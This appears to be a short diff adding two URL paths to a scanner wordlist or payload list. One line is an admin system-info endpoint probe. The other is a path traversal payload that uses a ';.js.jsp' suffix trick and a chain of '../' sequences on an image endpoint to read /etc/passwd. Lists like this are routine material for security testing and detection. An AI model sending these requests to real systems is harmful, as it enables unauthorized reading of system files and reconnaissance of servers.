@@ -1,0 +1,2 @@
+/admin/weichatcfg/getsysteminfo
+/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
